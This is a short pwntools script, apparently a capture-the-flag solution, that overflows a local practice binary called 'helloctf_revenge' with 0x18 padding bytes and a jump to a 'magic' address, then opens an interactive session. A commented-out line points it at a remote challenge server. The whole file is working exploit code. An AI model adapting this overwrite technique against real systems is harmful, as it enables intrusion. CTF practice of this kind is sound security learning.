#!/user/bin/ython3
# -*- conding: UTF-8 -*-
from pwn import *

context.arch = "amd64"
# p = remote('140.115.59.7',10000)
p = process('share/helloctf_revenge')
pause()

magic = 0x40125b
inp='\x41'*0x18
payload = flat(
    inp,
    # cyclic(),
    magic
)
p.sendlineafter(b"Do you like VTuber?\n",payload)
p.interactive()
p.close()


